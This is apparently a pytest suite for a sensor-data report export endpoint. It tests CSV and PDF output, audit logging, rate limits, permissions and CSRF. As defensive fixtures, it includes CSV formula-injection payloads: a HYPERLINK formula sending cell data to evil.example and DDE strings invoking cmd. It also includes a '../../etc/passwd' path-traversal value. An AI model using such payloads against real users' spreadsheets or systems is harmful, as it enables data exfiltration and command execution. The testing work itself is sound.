"""UC3 export (Algorithm 2): CSV and PDF, logging, the large-export warning, failures,
rate limit, permissions, and SEC-21 CSV formula-injection protection."""
import csv
import io
import json

import pytest
from pypdf import PdfReader

from backend.app.routers import reports
from backend.app.services import export
from backend.tests.conftest import email_of, login, post
from backend.tests.test_data_api import _agg, data_db  # noqa: F401 - fixture

URL = "/api/reports/export"
FILTERS = {"variable": "temperature_c", "resolution": "day", "start": "2025-07-01", "end": "2025-07-07"}

# Names a hostile or careless administrator could give a sensor (SEC-21)
FORMULA_NAMES = ['=HYPERLINK("https://evil.example/?x="&A1,"Click for details")', "+1+cmd|' /C calc'!A0",
                 "-2+3", "@SUM(1+1)*cmd|' /C calc'!A0", "\t=1+1", "\r=1+1"]


@pytest.fixture
def analyst(client, make_user, db_conn, data_db):  # noqa: F811
    login(client, email_of(db_conn, make_user(role="analyst")))
    return client


def _export(client, fmt="csv", **overrides):
    return post(client, URL, {**FILTERS, "format": fmt, **overrides})


def _csv_rows(response):
    text = response.content.decode("utf-8")
    assert text.startswith("﻿"), "BOM so Excel shows °C correctly"
    return list(csv.reader(io.StringIO(text[1:])))


def _split(rows):
    """(metadata rows, header, data rows): the blank row separates the metadata block."""
    blank = rows.index([])
    return rows[:blank], rows[blank + 1], rows[blank + 2:]


# ---------- CSV ----------
def test_csv_has_metadata_units_and_rows(analyst):
    r = _export(analyst)
    assert r.status_code == 200
    assert r.headers["content-type"] == "text/csv; charset=utf-8"
    assert r.headers["content-disposition"] == \
        'attachment; filename="maribyrnong_temperature_c_day_2025-07-01_2025-07-07.csv"'
    assert r.headers["cache-control"] == "no-store"
    meta, header, data = _split(_csv_rows(r))
    labels = dict(row[:2] for row in meta[1:])
    assert labels["Variable"] == "Temperature (°C)"
    assert labels["Resolution"] == "Daily"
    assert labels["Date range"] == "2025-07-01 to 2025-07-07 (local time)"
    assert labels["Land use"] == "All" and labels["Flagged readings"] == "Excluded"
    assert "Melbourne time" in labels["Generated"]
    assert "Data source" in labels and "75%" in labels["Completeness"]
    assert labels["Rows"] == "14"
    assert header == ["sensor_code", "sensor_name", "land_use", "location_verified", "period", "mean (°C)",
                      "min (°C)", "max (°C)", "readings", "completeness (%)", "valid"]
    assert len(data) == 14 == int(r.headers["x-export-rows"])
    assert data[0] == ["A-01", "Alpha", "Transport corridor", "yes", "2025-07-01", "11.0", "10.0", "12.0", "96",
                       "100.0", "yes"]
    bravo = [row for row in data if row[0] == "B-02"]
    assert {row[10] for row in bravo} == {"no"}, "50% complete days are marked invalid"


def test_csv_respects_filters_and_raw_has_flag_column(analyst):
    _, _, data = _split(_csv_rows(_export(analyst, land_use=["Parkland"])))
    assert {row[0] for row in data} == {"B-02"}
    r = _export(analyst, variable="pm25", resolution="raw", start="2025-07-01", end="2025-07-01",
                exclude_flagged=False)
    meta, header, data = _split(_csv_rows(r))
    assert header[4] == "reading_time_local" and header[-1] == "flagged"
    assert ["Flagged readings", "Included"] in meta
    assert sorted(row[-1] for row in data) == ["no", "no", "yes"]


def test_csv_exclude_flagged_uses_clean_values(analyst):
    _, _, data = _split(_csv_rows(_export(analyst, variable="pm25", sensor_ids=[1])))
    by_day = {row[4]: row for row in data}
    assert by_day["2025-07-03"][5] == "4.0"            # the clean row replaces the spike-affected mean


# ---------- SEC-21 ----------
@pytest.mark.parametrize("value", ["=1+1", "+1", "-1+1", "@SUM(A1)", "\t=1", "\r=1"])
def test_safe_cell_prefixes_formula_text(value):
    assert export.safe_cell(value) == "'" + value


@pytest.mark.parametrize("value", ["Alpha", "Footscray Park - Amenities", "1 = 1", "", " =1"])
def test_safe_cell_leaves_ordinary_text(value):
    assert export.safe_cell(value) == value


def test_safe_cell_keeps_numbers_as_numbers():
    assert export.safe_cell(-3.2) == -3.2 and export.safe_cell(0) == 0 and export.safe_cell(None) is None


def test_formula_cells_escaped(analyst, db_conn):
    """A sensor named =HYPERLINK(...) (and the other formula starts) is exported as text."""
    for i, name in enumerate(FORMULA_NAMES, start=10):
        db_conn.execute("INSERT INTO sensors (sensor_id, sensor_code, sensor_name, device_family, land_use, "
                        "location_verified, latitude, longitude) VALUES (?, ?, ?, 'mcc_aq', 'Industrial', 1, -37.8, "
                        "144.9)", (i, f"F-{i}", name))
        db_conn.execute("INSERT INTO sensor_variables (sensor_id, variable, unit, raw_column) "
                        "VALUES (?, 'temperature_c', '°C', 'temperature_c')", (i,))
        db_conn.execute("INSERT INTO aggregates (sensor_id, period, bucket_start_local, season, variable, mean, min, "
                        "max, n, completeness_pct, is_valid, qc_mode) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                        _agg(i, "day", "2025-07-02", "temperature_c", -1.5))
    db_conn.commit()
    _, _, data = _split(_csv_rows(_export(analyst, land_use=["Industrial"])))
    names = {row[0]: row[1] for row in data}
    for i, name in enumerate(FORMULA_NAMES, start=10):
        assert names[f"F-{i}"] == "'" + name
    assert {row[5] for row in data} == {"-1.5"}, "negative numbers stay numbers"
    raw = _export(analyst, land_use=["Industrial"]).content.decode("utf-8")
    assert '\n"=HYPERLINK' not in raw and ",=HYPERLINK" not in raw and ',"=HYPERLINK' not in raw


# ---------- PDF ----------
def _pdf_text(response) -> tuple[PdfReader, str]:
    assert response.content.startswith(b"%PDF-")
    reader = PdfReader(io.BytesIO(response.content))
    # pypdf cannot map reportlab's low character codes back to non-ASCII glyphs (° · “ show
    # as U+FFFD), although the PDF's ToUnicode map is correct; so assert on ASCII text only.
    return reader, " ".join(" ".join(page.extract_text() for page in reader.pages).split())


def test_pdf_has_every_section_and_page_numbers(analyst):
    r = _export(analyst, "pdf")
    assert r.status_code == 200 and r.headers["content-type"] == "application/pdf"
    assert r.headers["content-disposition"].endswith('.pdf"')
    reader, text = _pdf_text(r)
    pages = len(reader.pages)
    for n in range(1, pages + 1):
        assert f"Page {n} of {pages}" in reader.pages[n - 1].extract_text()
    for part in ("Temperature report", "Daily", "2025-07-01 to 2025-07-07", "Summary by sensor (highest mean first)",
                 "over time", "Threshold exceedances", "Data quality", "Melbourne time"):
        assert part in text, part
    assert reader.metadata.title == "Temperature report"
    assert len([img for page in reader.pages for img in page.images]) == 1


def test_pdf_summary_sorted_by_mean_descending_with_status(analyst, db_conn):
    # Bravo (6.0) has a higher PM2.5 mean than Alpha (~5.0); Alpha exceeded the standard in range
    db_conn.execute("INSERT INTO exceedances (sensor_id, threshold_id, date_local, observed_value, completeness_pct) "
                    "VALUES (1, 1, '2025-07-03', 31.0, 100.0)")
    db_conn.commit()
    _, text = _pdf_text(_export(analyst, "pdf", variable="pm25"))
    assert text.index("B-02") < text.index("A-01")
    assert "Threshold exceeded" in text and "Normal" in text
    assert "PM2.5 24-hour standard" in text and "31.0" in text


def test_pdf_status_without_a_standard(analyst, db_conn):
    db_conn.execute("DELETE FROM exceedances")
    db_conn.execute("DELETE FROM thresholds WHERE variable = 'temperature_c'")
    db_conn.commit()
    _, text = _pdf_text(_export(analyst, "pdf"))
    assert "No standard set" in text and "No threshold exceedances" in text


def test_summary_rows_put_no_data_last():
    result = {"thresholds": [], "series": [
        {"sensor_id": 1, "sensor_code": "A", "sensor_name": "a", "land_use": "x", "summary": {"mean": None}},
        {"sensor_id": 2, "sensor_code": "B", "sensor_name": "b", "land_use": "x", "summary": {"mean": 3.0}},
        {"sensor_id": 3, "sensor_code": "C", "sensor_name": "c", "land_use": "x", "summary": {"mean": 9.0}}]}
    rows = export.summary_rows(result, export.sensor_status(result, set()))
    assert [r["sensor_code"] for r in rows] == ["C", "B", "A"]
    assert {r["status"] for r in rows} == {export.STATUS_NO_STANDARD}


def test_pdf_escapes_markup_in_sensor_names(analyst, db_conn):
    db_conn.execute("UPDATE sensors SET sensor_name = '<b>bold</b> & <script>x</script>' WHERE sensor_id = 1")
    db_conn.commit()
    _, text = _pdf_text(_export(analyst, "pdf"))
    assert "<b>bold</b> & <script>x</script>" in text


# ---------- logging (UC3: reports + audit_log) ----------
def test_export_is_logged_to_reports_and_audit(analyst, db_conn):
    assert _export(analyst, "pdf", land_use=["Parkland"]).status_code == 200
    report = dict(db_conn.execute("SELECT * FROM reports").fetchone())
    assert report["format"] == "pdf" and report["report_type"] == "readings" and report["row_count"] == 7
    assert report["user_id"] is not None and report["created_date"] and report["file_path"] is None
    assert json.loads(report["filter_json"]) == {**FILTERS, "land_use": ["Parkland"], "sensor_ids": [],
                                                 "exclude_flagged": True}
    entry = db_conn.execute("SELECT * FROM audit_log WHERE action = 'report_export'").fetchone()
    detail = json.loads(entry["detail_json"])
    assert entry["user_id"] == report["user_id"] and detail["format"] == "pdf" and detail["rows"] == 7


def test_failed_export_is_audited_with_the_uc3_message(analyst, db_conn, monkeypatch):
    def boom(*args, **kwargs):
        raise RuntimeError("renderer crashed at /var/task/secret/path")

    monkeypatch.setattr(export, "to_pdf", boom)
    r = _export(analyst, "pdf")
    assert r.status_code == 500
    assert r.json()["error"]["message"] == "Export failed. Please try again or contact your administrator."
    assert "secret" not in r.text and "Traceback" not in r.text
    assert db_conn.execute("SELECT COUNT(*) FROM reports").fetchone()[0] == 0
    assert db_conn.execute("SELECT COUNT(*) FROM audit_log WHERE action = 'report_export_failed'").fetchone()[0] == 1


# ---------- large exports and limits ----------
def test_large_export_needs_confirmation(analyst, db_conn, monkeypatch):
    monkeypatch.setattr(export, "LARGE_EXPORT_ROWS", 10)
    r = _export(analyst)
    assert r.status_code == 409 and r.json()["error"]["code"] == "large_export"
    assert r.json()["error"]["message"] == \
        "This export contains a large amount of data and may take a moment to prepare."
    assert r.headers["x-export-rows"] == "14"
    assert db_conn.execute("SELECT COUNT(*) FROM reports").fetchone()[0] == 0
    assert _export(analyst, confirm_large=True).status_code == 200


def test_oversized_file_is_refused_not_truncated(analyst, monkeypatch):
    monkeypatch.setattr(export, "MAX_EXPORT_BYTES", 100)
    r = _export(analyst)
    assert r.status_code == 413 and r.json()["error"]["code"] == "export_too_large"


def test_no_data_and_bad_ranges(analyst):
    r = _export(analyst, start="2024-01-01", end="2024-01-31")
    assert r.status_code == 404 and r.json()["error"]["message"] == "No data available for the selected filters."
    assert _export(analyst, start="2025-07-07", end="2025-07-01").json()["error"]["message"] == \
        "Invalid date range selected."
    assert _export(analyst, resolution="raw", start="2025-07-01", end="2025-07-20").status_code == 400


@pytest.mark.parametrize("change", [{"format": "xlsx"}, {"variable": "aqi"}, {"resolution": "week"},
                                    {"land_use": ["Moon"]}, {"sensor_ids": [0]}, {"sensor_ids": list(range(1, 22))},
                                    {"file_path": "../../etc/passwd"}, {"start": "yesterday"}])
def test_invalid_body_rejected(analyst, change):
    assert post(analyst, URL, {**FILTERS, "format": "csv", **change}).status_code == 422


def test_exports_are_rate_limited(analyst):
    codes = [_export(analyst).status_code for _ in range(reports.EXPORTS_PER_USER.max_hits + 1)]
    assert codes[:-1] == [200] * reports.EXPORTS_PER_USER.max_hits
    assert codes[-1] == 429


# ---------- permissions and CSRF ----------
def test_anonymous_gets_401(client, data_db):  # noqa: F811
    client.cookies.set("mem_csrf", "anything")     # passes CSRF, so the role guard answers
    r = client.post(URL, json={**FILTERS, "format": "csv"}, headers={"X-CSRF-Token": "anything"})
    assert r.status_code == 401


def test_export_needs_the_csrf_header(analyst):
    r = analyst.post(URL, json={**FILTERS, "format": "csv"})
    assert r.status_code == 403 and r.json()["error"]["code"] == "csrf_failed"


@pytest.mark.parametrize("role", ["analyst", "admin"])
def test_every_role_with_export_data_can_export(client, make_user, db_conn, data_db, role):  # noqa: F811
    login(client, email_of(db_conn, make_user(role=role)))
    assert _export(client).status_code == 200


def test_role_without_export_data_is_refused(client, make_user, db_conn, data_db):  # noqa: F811
    db_conn.execute("UPDATE roles SET permissions = 'view_data,filter_data' WHERE role_id = 2")
    db_conn.commit()
    login(client, email_of(db_conn, make_user(role="analyst")))
    r = _export(client)
    assert r.status_code == 403
    assert db_conn.execute("SELECT COUNT(*) FROM reports").fetchone()[0] == 0
